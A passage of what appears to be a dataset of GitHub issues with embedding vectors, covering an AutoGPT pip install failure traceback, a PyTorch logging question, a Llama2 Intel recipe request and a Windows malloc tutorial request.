  6.08762838e-02 -1.08718492e-01  4.44048233e-02 -5.84947392e-02
  2.18624715e-02  1.73046142e-01  3.70970100e-01 -1.67955279e-01
 -1.00042313e-01  7.75831565e-02 -2.88262784e-01 -3.66872758e-01
  2.08902866e-01  1.22086063e-01 -3.01540583e-01 -1.27375081e-01
 -7.28328004e-02 -2.64949203e-01 -1.98572651e-02 -1.56855091e-01
 -5.63802421e-02  1.02100335e-02 -3.36313322e-02  3.83676618e-01
  6.18102998e-02  5.37311435e-02 -2.12136522e-01 -8.69924501e-02
 -2.71395981e-01  1.20647382e-02 -2.57670045e-01  4.10042070e-02
 -2.24949479e-01 -5.17536588e-02 -9.48306099e-02 -1.53829217e-01
  1.06789276e-01 -2.25537606e-02  3.31990838e-01  2.49781217e-02
 -2.08896339e-01 -3.10589135e-01 -3.13496768e-01  2.46844441e-01
 -2.61879921e-01 -3.29740226e-01 -1.15415305e-01 -1.33658350e-01
  2.63281941e-01  2.94917107e-01  1.32468194e-01  1.70117617e-01
 -6.16345406e-02 -1.69286504e-03  1.38203204e-01 -3.28177541e-01
  1.05355732e-01 -8.75162184e-02  1.96257457e-01  9.41728354e-02
  3.80693793e-01 -1.46088749e-03  2.76049972e-01 -1.44219607e-01
  1.32936127e-02  3.14801604e-01 -8.50198865e-02  5.47352910e-01
  2.16018930e-01  4.05928977e-02 -9.38890725e-02  2.99330771e-01
 -1.50279567e-01 -1.03800431e-01  2.31274396e-01 -3.59370381e-01
  2.02561259e-01  2.45593619e-02  1.37015447e-01 -3.04613352e-01
  5.79844713e-01  4.70439568e-02 -3.73438597e-02  4.71185073e-02
  2.21662059e-01  1.93479091e-01 -3.01347002e-02  1.64304137e-01
  3.51692200e-01 -3.43684971e-01 -2.27618873e-01 -1.94718972e-01
 -1.04736034e-02 -2.70077676e-01 -9.70025137e-02  6.98147640e-02
  2.88021475e-01  1.14485383e-01 -3.33954513e-01  4.55476642e-02
  2.46609211e-01 -5.21688089e-02  2.84996361e-01 -7.60923233e-03
 -2.04879612e-01  3.42825055e-02  2.17835099e-01 -1.64518077e-02
 -1.43391892e-01 -4.52518985e-02  1.83159783e-01  8.62071663e-02
  3.34272802e-01 -3.64529550e-01  2.74732351e-01  3.89562547e-01
  5.10223061e-02  1.67471945e-01 -1.14145517e-01  2.54570283e-02
 -1.12229332e-01  1.10100351e-01  8.67283791e-02  1.12011388e-01
  2.77238369e-01 -2.65455842e-01 -3.74176264e-01  7.74520487e-02
  8.98289084e-02 -1.87925875e-01 -1.88187927e-01 -3.35819125e-01
  6.53482080e-02 -1.21632472e-01  1.45732816e-02  2.23215744e-02
 -4.78404343e-01  1.02691106e-01  6.63008094e-02 -1.61421731e-01
 -2.82840226e-02  3.24849248e-01  1.37980923e-01 -3.09804559e-01
  4.76764217e-02 -1.42560363e-01 -3.85110565e-02 -1.48168683e-01
 -2.66169250e-01  5.19475415e-02  2.04833761e-01  8.79233554e-02
  1.40846744e-01  2.17284739e-01 -2.47042552e-01 -2.20440358e-01
  6.74865544e-02 -9.90633965e-02 -2.05283746e-01  4.62582350e-01
  6.95897564e-02  7.14282319e-02  3.91846120e-01  3.34858268e-01
 -3.70992094e-01 -1.86040282e-01 -1.62626132e-01 -2.46696860e-01
  2.69207433e-02 -1.63684845e-01 -3.38211283e-03  3.18818577e-02
  2.89112717e-01  1.05972022e-01 -3.93037140e-01  1.55536652e-01
 -2.69298017e-01 -1.03654683e-01  3.03170919e-01 -2.22549409e-01
  1.02158576e-01 -2.43529424e-01  8.91006738e-02 -1.10405773e-01
  7.87508339e-02  1.10846572e-01 -5.71682639e-02  2.44631529e-01]"
problem pip install -r requirements.txt ,"### ðŸ“š The doc issue

hi problem pip install -r requirements.txt
No matter what I do, auto gpt is not installed

 File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 353, in <module>
          main()
        File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 335, in main
          json_out['return_val'] = hook(**hook_input['kwargs'])
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 118, in get_requires_for_build_wheel
          return hook(config_settings)
                 ^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 355, in get_requires_for_build_wheel
          return self._get_build_requires(config_settings, requirements=['wheel'])
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 325, in _get_build_requires
          self.run_setup()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 341, in run_setup
          exec(code, locals())
        File ""<string>"", line 288, in <module>
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\__init__.py"", line 103, in setup
          return distutils.core.setup(**attrs)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\core.py"", line 185, in setup
          return run_commands(dist)
                 ^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\core.py"", line 201, in run_commands
          dist.run_commands()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\dist.py"", line 969, in run_commands
          self.run_command(cmd)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\dist.py"", line 989, in run_command
          super().run_command(command)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\dist.py"", line 988, in run_command
          cmd_obj.run()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 318, in run
          self.find_sources()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 326, in find_sources
          mm.run()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 548, in run
          self.add_defaults()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 586, in add_defaults
          sdist.add_defaults(self)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\sdist.py"", line 113, in add_defaults
          super().add_defaults()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\command\sdist.py"", line 251, in add_defaults
          self._add_defaults_ext()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\command\sdist.py"", line 336, in _add_defaults_ext
          self.filelist.extend(build_ext.get_source_files())
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""<string>"", line 204, in get_source_files
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\cmd.py"", line 107, in __getattr__
          raise AttributeError(attr)
      AttributeError: cython_sources
      [end of output]

  note: This error originates from a subprocess, and is likely not a problem with pip.
error: subprocess-exited-with-error

Ã— Getting requirements to build wheel did not run successfully.
â”‚ exit code: 1
â•°â”€> See above for output.

note: This error originates from a subprocess, and is likely not a problem with pip.
PS C:\AutoGPT\AutoGPT\AutoGPT-stable>

### Suggest a potential alternative/fix

_No response_",False,"[-0.20476422 -0.28862214  0.16670957 -0.14431682 -0.20948303 -0.02448764
  0.01460658 -0.08505996 -0.32023615  0.11024615 -0.10191635  0.04220769
  0.07243981  0.2345253  -0.1069449   0.16590579  0.03929382 -0.42275786
  0.10478455  0.02929142  0.04000572 -0.08135    -0.35081536  0.01446592
 -0.04186315 -0.04713812 -0.26884437 -0.02916341  0.09447558  0.29469317
  0.23439324 -0.02943427  0.20611477  0.01358904  0.7365832   0.22314769
 -0.17995572 -0.26909113  0.10977066 -0.07883781  0.28294986 -0.14928627
 -0.2498595  -0.22577101 -0.03422135 -0.4815373  -0.06826557 -0.16989282
 -0.28238803  0.03620122 -0.3112748   0.25252086 -0.50821203 -0.07508259
  0.09544437 -0.43348828  0.04414079  0.31966448  0.00183387 -0.11338389
  0.02560507 -0.17544973  0.11518027  0.09771819 -0.25521362  0.15519628
 -0.09832915  0.01214921  0.40124178 -0.4976607  -0.21216282  0.00817393
 -0.60681754 -0.2433416   0.27104354  0.0077473  -0.03799873  0.0779628
 -0.28273082 -0.22921106  0.08254407  0.0272656   0.04508433  0.08605988
 -0.15761006  0.06366255 -0.03137608  0.070585    0.05656244 -0.03547154
  0.5658827  -0.12679863  0.14535035  0.34670484  0.46032658  0.07940252
  0.00756133 -0.1427949  -0.29764873 -0.24095558  0.01165781 -0.17381874
 -0.07433669 -0.04073222  0.01836221  0.2384454   0.00204479  0.03557505
 -0.0945854  -0.10775456  0.08276172  0.00895957  0.0578903  -0.19324487
  0.10866741  0.36297613 -0.33864862  0.03378997 -0.2026707   0.3681271
 -0.23041567  0.02714092 -0.0907587   0.05766875  0.3869845  -0.11091461
  0.35446566 -0.13064016  0.00292306 -0.13319424  0.02268403  0.23430291
 -0.30268714  0.35035735  0.41360906  0.09701719 -0.19769166 -0.49030456
 -0.06612718 -0.06268901 -0.31089002  0.152637   -0.16535264 -0.23811686
 -0.10299724  0.07066743 -0.32974285  0.0561962  -0.15452853 -0.00540512
 -0.18134013  0.0825327  -0.43416584  0.28875947  0.02960646  0.07420717
  0.31181127  0.09260248 -0.13968581 -0.07819667 -0.12121502  0.16430983
 -0.24851951  0.0781015  -0.09275576  0.20271769 -0.25943235 -0.2651158
 -0.12542444  0.20582421  0.0623102   0.10033973  0.1850614   0.00924432
  0.15816462  0.14178047  0.31290916  0.10484806  0.08206897  0.29208606
  0.31295443  0.12224444  0.03817168 -0.05307404 -0.21530394  0.03147187
  0.04243185 -0.16486111  0.18013692  0.09572139  0.19776219 -0.04452574
  0.54402524 -0.00720589 -0.2977013  -0.09777036  0.581556    0.56642425
 -0.09394994  0.14194623  0.08105085  0.26571926  0.255155    0.09971881
  0.01164766  0.20725028 -0.05597106 -0.08370427 -0.35316026 -0.1585572
 -0.17911518  0.1963098   0.10443117 -0.48575306 -0.14263882  0.08526928
  0.18994209 -0.2622081   0.18186748 -0.203375   -0.3634758   0.23063743
  0.19708335 -0.04998934  0.28861293  0.09559748 -0.16634262 -0.07895309
 -0.14735183 -0.0297754  -0.11440486 -0.35866284  0.7509333   0.23611522
  0.23780945  0.24602085  0.23120788  0.14049071  0.11253208 -0.02264972
 -0.05731479 -0.41796005 -0.01955903  0.13347329 -0.06467003 -0.05505631
 -0.20480835  0.02169869 -0.3048572   0.22426814 -0.07653082 -0.5498477
  0.05549176 -0.04931835  0.22187364  0.20989166 -0.3611372  -0.11441381
  0.11588497 -0.03514606 -0.002518    0.6264107  -0.1000961   0.36298302
  0.48542354 -0.24498409 -0.090951   -0.09643264 -0.04190874 -0.16114448
  0.6799153  -0.6219548   0.0031632   0.37070873  0.16118523  0.22388585
  0.27270645 -0.07924544  0.16775563  0.25870037  0.01861769  0.50204456
 -0.41091776  0.01107882  0.20437211 -0.0247905   0.19224662 -0.40038544
 -0.5295777  -0.09698983  0.14371781 -0.36775932  0.142144    0.10596509
 -0.01975836 -0.11006553  0.18938358 -0.1213522   0.49070442  0.19155452
 -0.29421523  0.07942873  0.11730301  0.05762582 -0.13711321  0.28930932
 -0.07283608  0.17885974  0.2764536  -0.33993983  0.19968201  0.16884424
 -0.1029124   0.04319253 -0.11077723  0.1482044  -0.18200597  0.015623
  0.0639726   0.0727834   0.18054722 -0.0896947  -0.8158313   0.18888906
  0.14142735 -0.06070752 -0.6105602   0.20448805 -0.17482555  0.1952474
  0.38707042  0.36824918 -0.12817767  0.01415382 -0.36248356 -0.13492246
 -0.09866089  0.19817688  0.04516154 -0.4631057   0.2996622  -0.30537117
  0.12894729 -0.30925998 -0.3437783  -0.21676311  0.43440735  0.19358693
 -0.05718923  0.05833159  0.36047477 -0.1549848  -0.48256767  0.02938063
  0.03560755  0.20091388  0.15974629  0.22274722  0.06821951  0.24383035
 -0.15074907  0.07323313 -0.23486878 -0.46300834 -0.05937914 -0.17312154
 -0.02667582  0.10333376 -0.05206989  0.23065917 -0.3409745   0.09548004
 -0.24870864 -0.0713982   0.3238268   0.05655538 -0.03339561 -0.03664726
  0.00903034 -0.1697798  -0.4372512   0.290298    0.0455954  -0.10294722]"
Getting log for pytorch models ,"Hi,
   I would like know how we can generate log in pytorch that is in tenosrflow we have option of setting TF_CPP_MAX_VLOG_LEVEL flag.Do we have any options like this in pytorch.

Thanks
",False,"[-0.15176603 -0.12120601 -0.10566068 -0.03156702 -0.02075546  0.19807932
 -0.05030149  0.06679644 -0.2602901   0.3539107  -0.05458796 -0.16420935
  0.17863245  0.06345893  0.09855006  0.5732724  -0.17176603  0.00227425
 -0.0395514  -0.2381011   0.07830261 -0.06633104  0.3380289  -0.1447961
 -0.23382902 -0.35849318  0.04700943 -0.15624091 -0.15411769  0.3005253
 -0.23881575  0.35402033 -0.24912474 -0.04087344 -0.0367662   0.0503652
 -0.12174654  0.18332098 -0.22015153  0.03131007  0.06836738 -0.1825565
  0.02043754  0.08233225 -0.19878224 -0.14889246 -0.03213134  0.19629593
 -0.56966245  0.22210167  0.17721009  0.0414519  -0.18156548  0.00883595
  0.08173752  0.10547332 -0.15599644 -0.2117587  -0.10464894  0.00937578
 -0.2562186   0.00228603  0.41346157 -0.05048093  0.02566144  0.11490858
 -0.3376991   0.2648196   0.42192507 -0.0601648  -0.446729   -0.39528698
 -0.02831976 -0.2603267  -0.00449657  0.15635088 -0.16235942  0.23861295
  0.26493993 -0.10970567 -0.00977588  0.4062668   0.15124127 -0.30397817
  0.06255843  0.28740564  0.22824274 -0.06700397  0.10960943  0.1440162
  0.37320602 -0.27350488 -0.33022702  0.11899887  0.03681546  0.2627212
 -0.04604927 -0.07758329  0.22095196 -0.31513646  0.01955826 -0.05222545
  0.10340322  0.39980346  0.18889126 -0.17411694 -0.03286895  0.26479986
  0.10987046 -0.07891644  0.19083653  0.05292677  0.28008923  0.18643862
  0.22446403  0.11713511  0.12044313 -0.04228818  0.10740212  0.20822656
  0.33151555 -0.3431437   0.22671081  0.10784626 -0.1723705   0.22987384
 -0.18156879 -0.11241709  0.1858657   0.37465003  0.48942983 -0.0099408
  0.4164443   0.0622481  -0.20622006 -0.16406365 -0.02736316  0.06623125
 -0.4458298  -0.12859076 -0.00194485  0.04577766 -0.071518    0.05943689
 -0.2124656   0.10905904 -0.2586281   0.06861626 -0.02562383  0.01673871
  0.02015587 -0.2779454  -0.17449903  0.09777734  0.12706728 -0.05440374
 -0.09227651  0.02329617  0.23855706 -0.33706746  0.00954293 -0.1527949
  0.07734259 -0.28816092 -0.03447405  0.06251246  0.01418214  0.20793658
 -0.05977108  0.07089698  0.337607   -0.18613946 -0.22909436 -0.2598141
  0.3421688  -0.02421804 -0.18912244 -0.27884895  0.04850623  0.17681049
 -0.06503602  0.17336762  0.17941137 -0.15863003 -0.10673039 -0.09100565
  0.29132074  0.41156238 -0.07532447 -0.27312383  0.19115005 -0.47050235
  0.19185595 -0.18153352 -0.03262173 -0.508538    0.07647454 -0.03186333
  0.14287855 -0.1095162   0.25570184 -0.04981393  0.00286231  0.18690418
  0.1301034   0.24436396 -0.42749733 -0.20001937 -0.2769151   0.06127764
 -0.13467306 -0.19322795  0.01159975 -0.20855665 -0.20876193 -0.08122986
 -0.05837552 -0.19510995 -0.191853    0.18263     0.09240811 -0.06850892
 -0.07433707 -0.02396986 -0.22294755  0.27565336 -0.12962687 -0.04290648
  0.24912001 -0.00691342  0.2006156  -0.03642437 -0.03567862 -0.08398413
  0.2687459   0.12951376  0.05574166 -0.1107146   0.07185713  0.08757607
 -0.17924644  0.12058722 -0.36418772 -0.02030357 -0.2168322   0.1629454
 -0.3014303  -0.02309078 -0.10471205  0.11221819  0.16168511 -0.10970377
  0.08007819 -0.22019233  0.15779829  0.07869428 -0.16297837  0.19093966
  0.3105107  -0.3083759   0.49929914  0.18631956  0.02255759  0.45259112
  0.13924527  0.08909759 -0.28771928  0.14312792 -0.15194903  0.12492163
 -0.07609881 -0.2184307   0.03005236  0.29961765  0.12306727 -0.22425507
  0.1423102  -0.1566559  -0.01214972  0.21152554  0.39510185  0.31927836
  0.17673671  0.15799956 -0.22631377  0.05936688 -0.29365313 -0.14878201
 -0.41130427 -0.2171543  -0.20451012 -0.1109982  -0.15339677 -0.27453244
 -0.3434171   0.07733249  0.07992078  0.334445    0.05892724 -0.12576725
 -0.13822675 -0.08646476  0.28132033 -0.33526808 -0.16248715  0.051446
  0.0945323   0.01005245  0.46610156 -0.22913453  0.19859551  0.17743362
  0.2412115  -0.22999911 -0.09203836 -0.08223226 -0.39741203  0.3712008
  0.15812041 -0.02197698 -0.08313412 -0.37107638 -0.00708728  0.2111096
  0.34037954  0.40319246  0.21798965  0.04674556 -0.02022833 -0.09320528
  0.211932   -0.00244404  0.00964413  0.12637597  0.11702868 -0.05518723
  0.2603129   0.07246567  0.13063769 -0.2934772  -0.25938728 -0.01077643
 -0.08389652  0.09976063  0.15333305 -0.16861306 -0.10635331 -0.05230775
 -0.10865399 -0.04970887  0.15119034  0.41436166 -0.26882356 -0.11648929
  0.17056087  0.34953588 -0.14149374 -0.2988934  -0.10954148  0.25409716
 -0.11209799  0.3861506   0.14765407 -0.42918968 -0.08629505 -0.12305871
 -0.21550718 -0.53142303  0.0368275   0.08506276 -0.27315274  0.03768604
  0.20178935 -0.05158237 -0.18881148  0.14448087  0.15248735 -0.14086504
  0.23759842 -0.06036111 -0.05042645  0.04049949 -0.11008961 -0.6652225 ]"
Integrate Llama2 recipe on Intel platforms to llama-recipes docathon-h2-2023,"### ðŸ“š The doc issue

This request is to integrate Intel recipes of running Llama2 with Intel optimizations on Intel platforms to https://github.com/facebookresearch/llama-recipes/tree/main

### Suggest a potential alternative/fix

_No response_",False,"[-0.4712744   0.1077572   0.09110202  0.1703406  -0.03071574 -0.16264777
 -0.60845333 -0.22960778  0.10754158 -0.10579311  0.03092405  0.2473052
 -0.26948306 -0.04613798  0.27693647  0.27738395  0.10805117 -0.06711322
 -0.09315173 -0.05900052  0.0361224   0.12005201 -0.02752712 -0.00302776
  0.135908    0.14182694 -0.24558221  0.19752799  0.12908982  0.16679458
  0.44873133  0.20342746 -0.12365218 -0.19830126 -0.01679489  0.12868887
  0.2638774  -0.3158521  -0.08913759 -0.01661375 -0.15369341  0.2206495
 -0.03663441 -0.33565542 -0.05794765 -0.17178744 -0.37390146 -0.11949655
 -0.17872685 -0.03485067 -0.14838812 -0.3357219  -0.37264058 -0.64198416
  0.1611536  -0.06475163 -0.18051401  0.42619884  0.16677032  0.16447073
  0.20653166 -0.12951334  0.46997687 -0.11288486  0.00832205  0.03119451
 -0.02538004  0.2567261   0.03386847 -0.14779276 -0.0844419  -0.24160354
 -0.03240647 -0.33537257  0.06377154 -0.14014326  0.11687112 -0.17655289
  0.14591938 -0.07414468 -0.4564936  -0.22895497 -0.523663   -0.15941085
  0.066466   -0.06399063 -0.13162251 -0.0191082   0.20086    -0.26653764
  0.2103888  -0.5283914   0.10193308 -0.05902353  0.12787783  0.2241016
  0.02418964 -0.4075279  -0.14561273 -0.13517892  0.04501716 -0.7309741
 -0.20002264 -0.3578086  -0.04889849 -0.38163462 -0.09049992  0.34529346
  0.17096588 -0.13716008  0.00848833  0.15032491  0.2335639   0.08997429
 -0.02520495 -0.14388557 -0.2165352  -0.2258345  -0.0365559   0.00130972
 -0.06192508 -0.2020903   0.1315652   0.12070858  0.5552415  -0.07705382
 -0.25987038  0.1484461   0.0702731   0.10003843  0.14888808  0.10141921
  0.4745958  -0.02489595  0.07382939  0.20629321 -0.24085902 -0.25296295
 -0.01862111 -0.14505419 -0.33287588  0.35502884  0.05856346 -0.5760803
  0.14300564  0.19386223  0.41675314  0.36660966 -0.0482916  -0.01551249
  0.2394992  -0.08115286 -0.0175787   0.49654824  0.50195646 -0.12656882
 -0.0033122   0.1416387   0.18009768 -0.10291073 -0.05419903  0.13734423
 -0.02949998 -0.1758171  -0.331787    0.14230272 -0.43675494 -0.14919586
  0.17040731  0.54295754 -0.39070895 -0.00369975  0.14772093  0.3744691
  0.25207147  0.12554625  0.60597867 -0.45378307 -0.23385546  0.23928618
  0.3230296   0.16688137  0.5005744  -0.14187558  0.27288687  0.12405003
  0.3379789   0.14905596 -0.19347818 -0.11269411 -0.21234722 -0.02174063
  0.18055417  0.37484947  0.089779   -0.04572118 -0.15624708  0.08929722
  0.08948182 -0.13987502  0.0450253   0.16591357 -0.39709732  0.05141289
 -0.05435127 -0.16750261  0.02319175 -0.18660772 -0.0848065   0.198359
 -0.11094716 -0.2804303   0.00290936  0.05916204 -0.0677702   0.32434025
  0.19670208  0.25218162 -0.08106273 -0.35219797  0.02452388 -0.15639211
  0.08235785 -0.37763634 -0.45590395  0.07055017 -0.34245273  0.02447772
  0.08405941  0.02258604  0.01127264 -0.34254625  0.11652872 -0.00134672
  0.2611519  -0.18118152 -0.2647886  -0.1539935  -0.39341757  0.13079578
 -0.33461726 -0.01174185  0.02429332 -0.00386622  0.22542164  0.31747958
  0.03558562  0.04454658  0.21361946  0.02466959  0.09987764  0.13855733
  0.30515575 -0.33122274 -0.01361745 -0.00535649  0.2135296   0.05436468
  0.15998124 -0.2423273   0.09078983  0.5421747  -0.03058467  0.45530623
  0.32305405  0.14496852 -0.1907351   0.5370383  -0.09902205  0.35219616
 -0.35747042 -0.35337314  0.35494012 -0.09897403 -0.03582262 -0.08999912
  0.3920477  -0.36681265 -0.04305163  0.17438571  0.08630679  0.38757846
  0.03174498  0.05828774  0.11339778 -0.4420329   0.38302585 -0.35510182
 -0.3012111   0.09238189 -0.3137235   0.37248805 -0.17475994 -0.19279967
 -0.2880161  -0.06920333  0.42041716 -0.02713692  0.10491011  0.13336085
 -0.35130376  0.17601442  0.30844408 -0.13811998 -0.16015328  0.22064961
  0.00360914  0.16926618  0.54470736 -0.54874194  0.05542121  0.43300593
  0.03587365  0.2828738  -0.18432738  0.4639071   0.06477727  0.06396937
  0.11897905 -0.14936483  0.21221817 -0.53779244  0.04072387  0.26401705
  0.1442704   0.09228428 -0.2693473   0.05897832  0.16432106  0.01169195
 -0.00141186  0.46115175 -0.31692305  0.22756678 -0.37878788  0.01194625
  0.14346044  0.13369632  0.10873231 -0.26085573 -0.09759373  0.12767184
 -0.08195791  0.0312691   0.13347913 -0.09330124  0.0915648   0.27245724
 -0.02566179  0.0727001  -0.09766164 -0.23419654 -0.4546104  -0.03500088
  0.00808495 -0.17746586 -0.4114629   0.09301169  0.3385566  -0.05218149
 -0.07486601  0.13886258 -0.41544065  0.00700406  0.36431113 -0.18118526
 -0.10514254 -0.12016612  0.20320594  0.55995685 -0.33277366  0.20789613
 -0.02989669 -0.17857055  0.2835485  -0.1394758   0.08048772 -0.33655947
  0.22265425  0.15145402  0.28500843 -0.14523368  0.5430674  -0.25797242]"
A tutorial for introducing the third-party malloc library to improve pytorch memory performance on Windows feature module: windows module: memory usage triaged,"### ðŸ“š The doc issue

The tutorial is to introduce the new feature implemented by https://github.com/pytorch/pytorch/issues/102534 to accelerate performance on windows

### Suggest a potential alternative/fix

_No response_

cc @peterjc123 @mszhanyi @skyline75489 @nbcsm @vladimir-aubrecht @iremyux @Blackhex @cristianPanaite @fritzo @neerajprad @alicanb @nikitaved",False,"[ 1.58498794e-01  5.09361699e-02 -4.48562533e-01 -1.91873640e-01
 -3.90746117e-01 -1.04219422e-01 -3.56111914e-01 -4.72895503e-02
 -2.40861118e-01 -2.99925148e-01 -1.00601934e-01  5.13711646e-02
  1.10110074e-01 -2.29379550e-01 -4.98818234e-02  1.13776714e-01
  1.10473260e-01  7.15333819e-01 -1.27169654e-01 -1.47700071e-01
 -1.37058347e-01 -2.47963041e-01  5.48771024e-02  6.76825792e-02
  8.75600129e-02  8.59076530e-02 -1.92392189e-02 -4.86372769e-01
 -2.14759588e-01  2.25472569e-01  1.72118038e-01 -6.69494867e-02
  3.24459136e-01 -3.61731052e-01  7.07139522e-02  1.88233331e-01
 -9.74616557e-02 -1.58953771e-01  8.54775216e-03 -2.11422503e-01
 -3.71613763e-02  3.58249336e-01  3.05503886e-03 -3.69310975e-02
 -1.28664523e-01 -2.06691593e-01 -2.29502127e-01  2.99350947e-01
 -3.36179644e-01  1.28115579e-01 -7.14033693e-02 -1.07335091e-01
  3.68731022e-02 -4.94344503e-01 -1.21091001e-01 -2.28012800e-01
 -2.79993653e-01  2.21392587e-02 -2.19067454e-01  3.23070176e-02
 -5.26324734e-02 -1.50020704e-01  3.58197689e-01  7.68879727e-02
 -1.19856775e-01  3.39996517e-01  8.28523412e-02  2.36009598e-01
  3.73273402e-01 -3.20873439e-01 -3.03373903e-01  6.93986565e-02
 -3.98350060e-01 -3.72848034e-01  2.62460977e-01 -3.11170425e-02
 -6.15881905e-02 -7.35470653e-03  1.11154571e-01 -2.61038870e-01
  3.15372288e-01  3.17496508e-02 -1.12630092e-02 -2.77567059e-01
  1.82113126e-01 -5.94787300e-02  8.91694650e-02  1.84622258e-02
 -4.71416265e-02 -5.12217224e-01  3.57821941e-01 -4.39763702e-02
 -3.41622889e-01  2.44329542e-01  2.52763629e-01  2.11668402e-01
 -2.20746085e-01 -4.95082080e-01 -1.43568426e-01 -2.49092743e-01
  4.77366615e-03 -9.72562507e-02  1.83549792e-01  2.02156290e-01
  2.00282149e-02 -4.24904943e-01  3.94913256e-01  3.34545612e-01
  7.33472258e-02 -2.15619113e-02  2.98889101e-01  2.35824194e-02
 -1.51077788e-02  1.24141946e-03  6.87367320e-02  3.51356298e-01
 -5.60286678e-02  2.43655965e-01 -8.43259543e-02  1.76341921e-01
  8.28170404e-02 -3.41370761e-01 -7.15304259e-03  9.05842632e-02
 -2.90892422e-02 -5.68815097e-02 -3.91318142e-01  2.83982217e-01
 -2.11428955e-01 -1.12457886e-01  2.45538026e-01  9.34743062e-02
  1.86777607e-01 -1.26753539e-01  2.41513267e-01 -4.69190292e-02
  2.38461215e-02 -3.04423273e-01 -7.26698413e-02 -3.78359914e-01
 -1.32515654e-01  7.01170564e-02  3.40359807e-02 -6.87884688e-01
 -2.26885825e-01  4.40095693e-01 -8.56660977e-02 -4.05287184e-02
  3.11751887e-02  4.15834248e-01  1.58262953e-01  9.45260078e-02
  7.72724152e-02  4.83077049e-01  2.33232871e-01 -5.35520539e-02
  3.70505512e-01  3.52444537e-02  4.97773550e-02 -3.53076696e-01
 -4.04267341e-01  3.58116001e-01  4.74910252e-02 -2.39178583e-01
 -4.56665829e-02 -2.04592347e-02 -7.17490166e-02 -1.11509398e-01
  4.82899919e-02  1.26973376e-01 -1.28662720e-01  1.18321143e-01
 -1.17543228e-02 -2.72581995e-01  4.29593891e-01  1.53521061e-01
 -1.76099122e-01 -2.75816210e-02  3.61601382e-01  1.53416559e-01
 -1.51950568e-01  2.66271293e-01  2.88168639e-01 -1.56462640e-01
 -1.22718655e-01  3.41040730e-01  4.80246127e-01  3.30753386e-01
  2.33125523e-01 -2.41268277e-02 -2.76369512e-01 -2.99087584e-01
  4.18585911e-02 -4.76141632e-01  3.91207868e-03 -2.74348967e-02
 -3.10465991e-02  2.58287728e-01  7.64894038e-02  4.61061373e-02
  7.28400722e-02  2.45162863e-02  6.76777810e-02  2.18731388e-02
  3.17681193e-01  2.97974031e-02 -5.15147805e-01 -3.09475541e-01
  4.97410893e-02  2.46762764e-02 -1.78303003e-01 -2.20980242e-01
 -4.14380163e-01  2.39912584e-01 -1.65137291e-01  2.87970424e-01
  3.42421770e-01 -3.18856090e-02  2.43718848e-01  2.93574035e-01
 -1.60523266e-01  2.52112001e-03 -2.94174582e-01 -2.97242820e-01
  2.02716708e-01 -2.90034145e-01 -2.49609664e-01  7.37435073e-02
  1.20877195e-02 -5.45564219e-02 -2.90118456e-01 -4.98058915e-01
  1.62708312e-01 -2.24258959e-01  5.94879687e-02  2.49015510e-01
  1.98541731e-02  8.69461447e-02  1.23677246e-01  3.44747841e-01
 -5.58284298e-02 -1.42265975e-01 -2.21088141e-01 -1.11398771e-02
  5.88588938e-02  2.96365559e-01 -1.95943981e-01 -1.19260207e-01
 -2.55563915e-01 -6.50241524e-02  1.94507569e-01 -4.38107729e-01
  3.13095987e-01 -5.58093265e-02  5.86853288e-02  8.68091881e-02
 -4.70298529e-02 -2.25302741e-01  1.69083655e-01 -6.87473863e-02
  4.17568803e-01 -1.13295160e-01 -2.67846584e-01  3.73781413e-01
  2.48790652e-01  1.24699965e-01 -4.05608863e-01  1.78215981e-01
  1.73140302e-01 -1.09669939e-01  1.60176143e-01 -2.72656024e-01
 -3.01641077e-02 -6.84263883e-04  2.28653759e-01 -2.53600121e-01
